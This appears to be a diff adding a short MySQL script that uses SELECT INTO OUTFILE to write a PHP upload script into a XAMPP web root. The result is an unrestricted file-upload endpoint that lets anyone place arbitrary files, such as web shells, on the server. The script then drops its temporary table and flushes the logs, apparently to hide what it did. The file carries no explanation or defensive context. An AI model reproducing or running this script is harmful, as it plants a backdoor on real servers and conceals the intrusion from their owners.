@@ -1,0 +1,7 @@
+use test;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<?php $uploaddir = "C:\\xampp\\htdocs\\";$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]); echo "<pre>";if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile))print "";?>');
+SELECT * INTO OUTFILE 'C:\\xampp\\htdocs\\upload.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
